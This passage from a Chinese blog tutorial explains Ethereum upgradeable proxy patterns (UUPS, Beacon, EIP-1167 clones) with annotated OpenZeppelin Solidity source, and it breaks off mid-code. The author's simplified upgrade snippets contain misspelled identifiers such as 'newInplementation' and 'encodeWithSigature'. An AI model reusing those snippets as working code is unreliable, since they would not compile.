将逻辑合约的地址存储keccak256(&quot;PROXIABLE&quot;)在代理合约中。<br>    function proxiableUUID() public pure returns (bytes32) &#123;<br>        return 0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="OpenZeppelin-中的应用"><a href="#OpenZeppelin-中的应用" class="headerlink" title="OpenZeppelin 中的应用"></a>OpenZeppelin 中的应用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.5.0) (proxy/utils/UUPSUpgradeable.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;../../interfaces/draft-IERC1822.sol&quot;;<br>import &quot;../ERC1967/ERC1967Upgrade.sol&quot;;<br><br>/**<br> * @dev An upgradeability mechanism designed for UUPS proxies. The functions included here can perform an upgrade of an<br> * &#123;ERC1967Proxy&#125;, when this contract is set as the implementation behind such a proxy.<br> *<br> * A security mechanism ensures that an upgrade does not turn off upgradeability accidentally, although this risk is<br> * reinstated if the upgrade retains upgradeability but removes the security mechanism, e.g. by replacing<br> * `UUPSUpgradeable` with a custom implementation of upgrades.<br> *<br> * The &#123;_authorizeUpgrade&#125; function must be overridden to include access restriction to the upgrade mechanism.<br> *<br> * _Available since v4.1._<br> */<br>abstract contract UUPSUpgradeable is IERC1822Proxiable, ERC1967Upgrade &#123;<br>    /// @custom:oz-upgrades-unsafe-allow state-variable-immutable state-variable-assignment<br>    address private immutable __self = address(this);<br><br>    /**<br>     * @dev Check that the execution is being performed through a delegatecall call and that the execution context is<br>     * a proxy contract with an implementation (as defined in ERC1967) pointing to self. This should only be the case<br>     * for UUPS and transparent proxies that are using the current contract as their implementation. Execution of a<br>     * function through ERC1167 minimal proxies (clones) would not normally pass this test, but is not guaranteed to<br>     * fail.<br>     */<br>    // 检查执行是否通过委托调用执行，并且执行上下文是一个代理合约，其实现（如 ERC1967 中定义）指向 self. 这应该只适用于使用当前合同作为其实现的 UUPS 和透明代理。通过 ERC1167 最小代理（克隆）执行函数通常不会通过此测试，但不能保证会失败。<br>    modifier onlyProxy() &#123;<br>        require(address(this) != __self, &quot;Function must be called through delegatecall&quot;);<br>        require(_getImplementation() == __self, &quot;Function must be called through active proxy&quot;);<br>        _;<br>    &#125;<br><br>    /**<br>     * @dev Check that the execution is not being performed through a delegate call. This allows a function to be<br>     * callable on the implementing contract but not through proxies.<br>     */<br>    // 检查执行是否不是通过委托调用执行的。这允许函数可以在执行合约上调用，但不能通过代理调用。<br>    modifier notDelegated() &#123;<br>        require(address(this) == __self, &quot;UUPSUpgradeable: must not be called through delegatecall&quot;);<br>        _;<br>    &#125;<br><br>    /**<br>     * @dev Implementation of the ERC1822 &#123;proxiableUUID&#125; function. This returns the storage slot used by the<br>     * implementation. It is used to validate the implementation&#x27;s compatibility when performing an upgrade.<br>     *<br>     * IMPORTANT: A proxy pointing at a proxiable contract should not be considered proxiable itself, because this risks<br>     * bricking a proxy that upgrades to it, by delegating to itself until out of gas. Thus it is critical that this<br>     * function revert if invoked through a proxy. This is guaranteed by the `notDelegated` modifier.<br>     */<br>    // ERC1822proxiableUUID功能的实现。这将返回实现使用的存储槽。它用于验证此实现在升级后是否仍然有效。<br>    // 指向可代理合约的代理本身不应该被认为是可代理的，因为这可能会通过委托给自己直到耗尽gas而破坏升级到它的代理。因此，如果通过代理调用此函数，则该函数恢复至关重要。这是由notDelegated修饰符保证的。<br>    function proxiableUUID() external view virtual override notDelegated returns (bytes32) &#123;<br>        return _IMPLEMENTATION_SLOT;<br>    &#125;<br><br>    /**<br>     * @dev Upgrade the implementation of the proxy to `newImplementation`.<br>     *<br>     * Calls &#123;_authorizeUpgrade&#125;.<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     */<br>    // 将代理的实施升级到newImplementation.<br>    function upgradeTo(address newImplementation) external virtual onlyProxy &#123;<br>        _authorizeUpgrade(newImplementation);<br>        _upgradeToAndCallUUPS(newImplementation, new bytes(0), false);<br>    &#125;<br><br>    /**<br>     * @dev Upgrade the implementation of the proxy to `newImplementation`, and subsequently execute the function call<br>     * encoded in `data`.<br>     *<br>     * Calls &#123;_authorizeUpgrade&#125;.<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     */<br>    // 将代理的实现升级到newImplementation，然后执行编码在 中的函数调用data。<br>    function upgradeToAndCall(address newImplementation, bytes memory data) external payable virtual onlyProxy &#123;<br>        _authorizeUpgrade(newImplementation);<br>        _upgradeToAndCallUUPS(newImplementation, data, true);<br>    &#125;<br><br>    /**<br>     * @dev Function that should revert when `msg.sender` is not authorized to upgrade the contract. Called by<br>     * &#123;upgradeTo&#125; and &#123;upgradeToAndCall&#125;.<br>     *<br>     * Normally, this function will use an xref:access.adoc[access control] modifier such as &#123;Ownable-onlyOwner&#125;.<br>     *<br>     * ```solidity<br>     * function _authorizeUpgrade(address) internal override onlyOwner &#123;&#125;<br>     * ```<br>     */<br>    // 当 `msg.sender` 无权升级合约时应该revert的功能。<br>    function _authorizeUpgrade(address newImplementation) internal virtual;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Openzeppelin中关于EIP-1822的实现与EIP-1822中的定义并不一致，主要是EIP-1822中定义的插槽位置与EIP-1967中定义的插槽位置不一致导致。openzeppelin选择使用EIP-1967中定义的插槽位置来具体实现。同时EIP-1822也有很明显的缺点，即新来的一个实现合约中只实现了proxiableUUID方法，没有实现updateCodeAddress方法，则合约就无法继续升级，导致所有的代理合约都锁死。</p><p>故openzepplin在具体实现时，其实现的具体思路为：提供一个UUPSUpgradeable合约，在该合约中提供合约升级方法：upgradeTo. 与EIP-1822的不同点在于，它取消了proxiableUUID这个flag，增加了_autorizeUpgrade方法，用于授权一个新地址。同时提供了一个upgradeToAndCall方法，用于升级后马上进行初始化操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upgradeTo</span>(<span class="hljs-params">address newImplementation</span>) <span class="hljs-title">external</span> <span class="hljs-title">virtual</span> </span>&#123;<br>    <span class="hljs-comment">//第一步检查msg.sender的权限</span><br>    _authorizeUpgrade(newInplementation);<br>    <span class="hljs-comment">//第二步执行升级步骤</span><br>    _upgradeToAndCallSecure(newImplementaion,<span class="hljs-keyword">new</span> bytes(<span class="hljs-number">0</span>),<span class="hljs-literal">false</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upgradeToAndCall</span>(<span class="hljs-params">address newImplementation, bytes memory data</span>) <span class="hljs-title">external</span> <span class="hljs-title">payable</span> <span class="hljs-title">virtual</span> </span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_authorizeUpgrade</span>(<span class="hljs-params">address newImplementation</span>) <span class="hljs-title">internal</span> <span class="hljs-title">onlyOwner</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>其中，openzeppelin通过回滚检测，来检查是否升级成功，避免了EIP-1822中遇到的问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function _upgradeToAndCallSecure(address newImplementation,bytes memory data,bool forceCall) internal &#123;<br>    //第一步：设置newImpl地址到实现合约地址<br>    address oldImplementation = _getImplementation();<br>    _setImplementation(newImplementation);<br>    //第二步：针对新的实现合约地址进行初始化<br>    if (data.length &gt; 0 || forceCall) &#123;<br>        Address.delegateCall(newImplementation, data);<br>    &#125;<br>    //第三步：执行回滚检查<br>    // Perform rollback test if not already in progress<br>    StorageSlot.BooleanSlot storage rollbackTesting = StorageSlot.getBooleanSlot(_ROLLBACK_SLOT);<br>    //第四步：首先假设触发回滚操作，由新地址重新回滚到旧地址上，再检查升级后的旧地址是否是之前的旧地址，如果是，则说明回滚成功。如果可以回滚成功，说明升级到该新地址是安全的。<br>    if (!rollbackTesting.value) &#123;<br>        //需要执行回滚操作<br>        //即将impl地址由新地址改回旧地址，通过调用新地址上的upgradeTo方法来进行<br>        rollbackTesting.value = true;<br>        Address.functionDelegateCall(newInplementation, abi.encodeWithSigature(&quot;upgradeTo(address)&quot;,oldImplementation));<br>        rollbackTesting.value = false;<br>        //检查回滚是否成功<br>        require(oldImplementation == _getImplementation());<br>        //最后设置回新地址，并打log Upgraded(address)<br>        _upgradeTo(newImplementation);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h4><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/proxy/beacon">beacon 代码</a></p><p>以上两种代理，都存在一种缺陷，就是如果我要升级一批具有相同逻辑合约的代理合约，那么需要在每个代理合约都执行一遍升级（因为每个代理合约独立存储了 <code>_implementation</code>）。信标合约，就是将所有的具有相同逻辑合约的代理合约的 <code>_implementation</code> 只存一份在信标合约中，所有的代理合约通过和信标合约接口调用，获取 <code>_implementation</code>，这样，在升级的时候，就可以只升级信标合约，就能搞定所有的代理合约的升级。</p><p><img src="/2022/11/13/upgradeable/image-20221104215922504.png" alt="image-20221104215922504"></p><h5 id="BeaconProxy"><a href="#BeaconProxy" class="headerlink" title="BeaconProxy"></a>BeaconProxy</h5><p>此合约实现一个代理，该代理从<a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#UpgradeableBeacon"><code>可升级信标</code></a>获取每个调用的实现地址。</p><p>信标地址存储在存储插槽中， 因此它不会 与代理后面实现的存储布局冲突。<code>uint256(keccak256(&#39;eip1967.proxy.beacon&#39;)) - 1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.7.0) (proxy/beacon/BeaconProxy.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;./IBeacon.sol&quot;;<br>import &quot;../Proxy.sol&quot;;<br>import &quot;../ERC1967/ERC1967Upgrade.sol&quot;;<br><br>/**<br> * @dev This contract implements a proxy that gets the implementation address for each call from an &#123;UpgradeableBeacon&#125;.<br> *<br> * The beacon address is stored in storage slot `uint256(keccak256(&#x27;eip1967.proxy.beacon&#x27;)) - 1`, so that it doesn&#x27;t<br> * conflict with the storage layout of the implementation behind the proxy.<br> *<br> * _Available since v3.4._<br> */<br>contract BeaconProxy is Proxy, ERC1967Upgrade &#123;<br>    /**<br>     * @dev Initializes the proxy with `beacon`.<br>     *<br>     * If `data` is nonempty, it&#x27;s used as data in a delegate call to the implementation returned by the beacon. This<br>     * will typically be an encoded function call, and allows initializing the storage of the proxy like a Solidity<br>     * constructor.<br>     *<br>     * Requirements:<br>     *<br>     * - `beacon` must be a contract with the interface &#123;IBeacon&#125;.<br>     */<br>    // 初始化 beacon 代理<br>    // 如果 `data` 不为空，它会在对信标返回的实现的委托调用中用作数据。 这通常是一个编码的函数调用，并允许像 Solidity 构造函数一样初始化代理的存储<br>    constructor(address beacon, bytes memory data) payable &#123;<br>        _upgradeBeaconToAndCall(beacon, data, false);<br>    &#125;<br><br>    /**<br>     * @dev Returns the current beacon address.<br>     */<br>    // 返回当前信标地址<br>    function _beacon() internal view virtual returns (address) &#123;<br>        return _getBeacon();<br>    &#125;<br><br>    /**<br>     * @dev Returns the current implementation address of the associated beacon.<br>     */<br>    //  返回关联信标的当前逻辑合约地址<br>    function _implementation() internal view virtual override returns (address) &#123;<br>        return IBeacon(_getBeacon()).implementation();<br>    &#125;<br><br>    /**<br>     * @dev Changes the proxy to use a new beacon. Deprecated: see &#123;_upgradeBeaconToAndCall&#125;.<br>     *<br>     * If `data` is nonempty, it&#x27;s used as data in a delegate call to the implementation returned by the beacon.<br>     *<br>     * Requirements:<br>     *<br>     * - `beacon` must be a contract.<br>     * - The implementation returned by `beacon` must be a contract.<br>     */<br>    // 更改代理以使用新信标。已弃用，参阅 _upgradeBeaconToAndCall<br>    function _setBeacon(address beacon, bytes memory data) internal virtual &#123;<br>        _upgradeBeaconToAndCall(beacon, data, false);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="IBeacon"><a href="#IBeacon" class="headerlink" title="IBeacon"></a>IBeacon</h5><p>接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.4.1 (proxy/beacon/IBeacon.sol)<br><br>pragma solidity ^0.8.0;<br><br>/**<br> * @dev This is the interface that &#123;BeaconProxy&#125; expects of its beacon.<br> */<br>interface IBeacon &#123;<br>    /**<br>     * @dev Must return an address that can be used as a delegate call target.<br>     *<br>     * &#123;BeaconProxy&#125; will check that this address is a contract.<br>     */<br>    // 必须返回可用作委托调用目标的地址。<br>    function implementation() external view returns (address);<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="UpgradeableBeacon"><a href="#UpgradeableBeacon" class="headerlink" title="UpgradeableBeacon"></a>UpgradeableBeacon</h5><p>本合约与一个或多个<a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#BeaconProxy"><code>信标代理</code></a>实例结合使用，以确定其 实现协定，这是他们将委派所有函数调用的地方。</p><p>所有者能够更改信标指向的实现， 从而升级使用此信标的代理.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.4.1 (proxy/beacon/UpgradeableBeacon.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;./IBeacon.sol&quot;;<br>import &quot;../../access/Ownable.sol&quot;;<br>import &quot;../../utils/Address.sol&quot;;<br><br>/**<br> * @dev This contract is used in conjunction with one or more instances of &#123;BeaconProxy&#125; to determine their<br> * implementation contract, which is where they will delegate all function calls.<br> *<br> * An owner is able to change the implementation the beacon points to, thus upgrading the proxies that use this beacon.<br> */<br>contract UpgradeableBeacon is IBeacon, Ownable &#123;<br>    address private _implementation;<br><br>    /**<br>     * @dev Emitted when the implementation returned by the beacon is changed.<br>     */<br>    event Upgraded(address indexed implementation);<br><br>    /**<br>     * @dev Sets the address of the initial implementation, and the deployer account as the owner who can upgrade the<br>     * beacon.<br>     */<br>    // 设置初始实现的地址，部署者帐户为可以升级信标的所有者。<br>    constructor(address implementation_) &#123;<br>        _setImplementation(implementation_);<br>    &#125;<br><br>    /**<br>     * @dev Returns the current implementation address.<br>     */<br>    // 返回当前逻辑合约地址<br>    function implementation() public view virtual override returns (address) &#123;<br>        return _implementation;<br>    &#125;<br><br>    /**<br>     * @dev Upgrades the beacon to a new implementation.<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     *<br>     * Requirements:<br>     *<br>     * - msg.sender must be the owner of the contract.<br>     * - `newImplementation` must be a contract.<br>     */<br>    // 升级信标<br>    // 要求：msg.sender必须是合同的所有者。newImplementation必须是合同。<br>    function upgradeTo(address newImplementation) public virtual onlyOwner &#123;<br>        _setImplementation(newImplementation);<br>        emit Upgraded(newImplementation);<br>    &#125;<br><br>    /**<br>     * @dev Sets the implementation contract address for this beacon<br>     *<br>     * Requirements:<br>     *<br>     * - `newImplementation` must be a contract.<br>     */<br>    // 设置此信标的实现合约地址<br>    function _setImplementation(address newImplementation) private &#123;<br>        require(Address.isContract(newImplementation), &quot;UpgradeableBeacon: implementation is not a contract&quot;);<br>        _implementation = newImplementation;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="EIP1167"><a href="#EIP1167" class="headerlink" title="EIP1167"></a>EIP1167</h3><h4 id="最小代理合约"><a href="#最小代理合约" class="headerlink" title="最小代理合约"></a>最小代理合约</h4><p><a href="https://www.youtube.com/watch?v=7H7GVI1gsTc">https://www.youtube.com/watch?v=7H7GVI1gsTc</a></p><p><a href="https://blog.openzeppelin.com/deep-dive-into-the-minimal-proxy-contract/">https://blog.openzeppelin.com/deep-dive-into-the-minimal-proxy-contract/</a></p><p><a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1167.md">EIP1167官方文档</a></p><p>不要混淆可升级代理和最小代理，这是非常重要的，它们是完全不同的。</p><h4 id="要解决的问题"><a href="#要解决的问题" class="headerlink" title="要解决的问题"></a>要解决的问题</h4><p>避免重复部署同样的合约代码，取而代之的是只部署一次合约代码，当需要一份拷贝的时候，就只需要部署一个简单的代理合约。代理合约使用<code>delegatecall</code>来调用合约代码，代理合约有自己的地址、存储插槽和以太余额等。主要目的是为了节约Gas。</p><p>EIP-1167标准是为了以不可改变的方式简单而廉价地克隆目标合约的功能，它规定了一个最小的字节码实现，它将所有调用委托给一个已知的固定地址。</p><p><img src="/2022/11/13/upgradeable/erc-1167.png" alt="img"></p><p>为了实施这个标准，我们需要：</p><ul><li>执行合约：有时被称为基础合约、核心合约、主合约等。重要的是，执行合约是所有逻辑所在的地方。</li><li>代理工厂或克隆工厂：顾名思义，克隆工厂合约将是我们的工厂。这意味着用户将调用工厂的一个函数，而工厂将克隆一份实施合同的精确副本，但拥有自己的存储空间。这意味着每个克隆都有相同的逻辑，但存储状态独立。</li><li>代理：如前所述，代理合约是实施合约的克隆，但具有独特的存储。</li></ul><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>EIP1167 所做的事情可以概括如下，它只是把这个步骤翻译成了字节码形式</p><ol><li>接收请求数据</li><li>将请求数据通过 <a href="https://links.jianshu.com/go?to=https://github.com/ethereum/EIPs/blob/master/EIPS/eip-7.md">DELEGATECALL</a> 指令传递给目标实现合约。</li><li>得到合约调用的返回数据</li><li>将结果返回给调用者或者将交易回滚</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.7.0) (proxy/Clones.sol)<br><br>pragma solidity ^0.8.0;<br><br>/**<br> * @dev https://eips.ethereum.org/EIPS/eip-1167[EIP 1167] is a standard for<br> * deploying minimal proxy contracts, also known as &quot;clones&quot;.<br> *<br> * &gt; To simply and cheaply clone contract functionality in an immutable way, this standard specifies<br> * &gt; a minimal bytecode implementation that delegates all calls to a known, fixed address.<br> *<br> * The library includes functions to deploy a proxy using either `create` (traditional deployment) or `create2`<br> * (salted deterministic deployment). It also includes functions to predict the addresses of clones deployed using the<br> * deterministic method.<br> *<br> * _Available since v3.4._<br> */<br>library Clones &#123;<br>    /**<br>     * @dev Deploys and returns the address of a clone that mimics the behaviour of `implementation`.<br>     *<br>     * This function uses the create opcode, which should never revert.<br>     */<br>    // 部署并返回模仿其行为的克隆的地址 implementation。此函数使用创建操作码，该操作码不应还原。<br>    function clone(address implementation) internal returns (address instance) &#123;<br>        /// @solidity memory-safe-assembly<br>        assembly &#123;<br>            // Cleans the upper 96 bits of the `implementation` word, then packs the first 3 bytes<br>            // of the `implementation` address with the bytecode before the address.<br>            mstore(0x00, or(shr(0xe8, shl(0x60, implementation)), 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000))<br>            // Packs the remaining 17 bytes of `implementation` with the bytecode after the address.<br>            mstore(0x20, or(shl(0x78, implementation), 0x5af43d82803e903d91602b57fd5bf3))<br>            instance := create(0, 0x09, 0x37)<br>        &#125;<br>        require(instance != address(0), &quot;ERC1167: create failed&quot;);<br>    &#125;<br><br>    /**<br>     * @dev Deploys and returns the address of a clone that mimics the behaviour of `implementation`.<br>     *<br>     * This function uses the create2 opcode and a `salt` to deterministically deploy<br>     * the clone. Using the same `implementation` and `salt` multiple time will revert, since<br>     * the clones cannot be deployed twice at the same address.<br>     */<br>    // 部署并返回模仿“实现”行为的克隆的地址。<br>    // 此函数使用 create2 操作码和 `salt` 来确定性地部署克隆。 多次使用相同的 `implementation` 和 `salt` 将 revert，因为克隆不能在同一地址部署两次。<br>    function cloneDeterministic(address implementation, bytes32 salt) internal returns (address instance) &#123;<br>        /// @solidity memory-safe-assembly<br>        assembly &#123;<br>            // Cleans the upper 96 bits of the `implementation` word, then packs the first 3 bytes<br>            // of the `implementation` address with the bytecode before the address.<br>            mstore(0x00, or(shr(0xe8, shl(0x60, implementation)), 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000))<br>            // Packs the remaining 17 bytes of `implementation` with the bytecode after the address.<br>            mstore(0x20, or(shl(0x78, implementation), 0x5af43d82803e903d91602b57fd5bf3))<br>            instance := create2(0, 0x09, 0x37, salt)<br>        &#125;<br>        require(instance != address(0), &quot;ERC1167: create2 failed&quot;);<br>    &#125;<br><br>    /**<br>     * @dev Computes the address of a clone deployed using &#123;Clones-cloneDeterministic&#125;.<br>     */<br>    // 计算使用 &#123;Clones-cloneDeterministic&#125; 部署的克隆的地址。<br>    function predictDeterministicAddress(<br>        address implementation,<br>        bytes32 salt,<br>        address deployer<br>    ) internal pure returns (address predicted) &#123;<br>        /// @solidity memory-safe-assembly<br>        assembly &#123;<br>            let ptr := mload(0x40)<br>            mstore(add(ptr, 0x38), deployer)<br>            mstore(add(ptr, 0x24), 0x5af43d82803e903d91602b57fd5bf3ff)<br>            mstore(add(ptr, 0x14), implementation)<br>            mstore(ptr, 